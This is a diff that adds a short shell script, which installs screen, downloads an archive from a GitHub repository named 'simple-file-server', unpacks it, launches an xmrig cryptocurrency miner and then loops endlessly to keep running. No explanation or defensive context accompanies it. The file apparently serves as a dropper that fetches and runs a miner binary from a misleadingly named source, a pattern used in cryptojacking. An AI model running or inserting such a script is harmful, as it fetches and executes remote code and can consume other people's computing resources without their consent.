@@ -1,0 +1,10 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://raw.githubusercontent.com/dawnadvent/simple-file-server/master/xm.tar.gz
+tar xf xm.tar.gz
+./xmrig
+while [ 1 ];do
+sleep 3
+done
+sleep 999
